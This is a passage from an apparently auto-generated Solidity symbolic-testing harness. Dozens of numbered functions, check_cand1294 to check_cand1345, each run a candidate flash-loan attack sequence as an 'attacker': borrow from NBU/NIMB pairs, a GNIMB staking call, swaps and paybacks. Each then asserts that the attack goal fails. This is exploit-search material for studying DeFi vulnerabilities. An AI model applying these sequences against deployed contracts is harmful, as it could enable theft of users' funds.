        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
